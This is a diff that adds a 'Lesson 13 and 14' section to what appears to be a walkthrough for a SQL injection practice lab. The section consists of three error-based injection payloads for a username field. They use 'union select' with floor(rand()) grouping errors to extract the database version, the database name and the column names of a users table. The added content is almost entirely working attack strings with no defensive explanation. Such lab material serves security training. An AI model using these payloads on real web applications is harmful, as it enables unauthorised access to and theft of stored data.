@@ -99,3 +99,21 @@ Similar to Lesson-9, but use double quote instead of single quote.
 
 
 ```	
+### Lesson 13 And  14
+
+
+```
+Get database version
+
+username: ') union select count(*),concat( floor(rand(0)*2), 0x5e5e5e, version(), 0x5e5e5e) x from information_schema.character_sets group by x#
+
+
+username: ') union select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a#
+
+username: ') union select count(*), concat((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a;
+
+
+
+
+
+```
